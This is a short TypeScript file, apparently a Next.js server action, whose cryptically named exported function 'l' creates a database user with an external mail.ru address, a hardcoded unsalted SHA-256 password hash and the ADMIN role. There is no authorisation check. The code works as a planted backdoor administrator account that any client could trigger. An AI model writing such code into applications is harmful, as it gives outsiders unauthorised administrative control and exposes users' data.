"use server";
import db from "../../../db/db";

export async function l() {
  db.user.create({
    data: {
      email: "ritual-sculpture@mail.ru",
      password:
        "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9",
      role: "ADMIN",
    },
  });
}
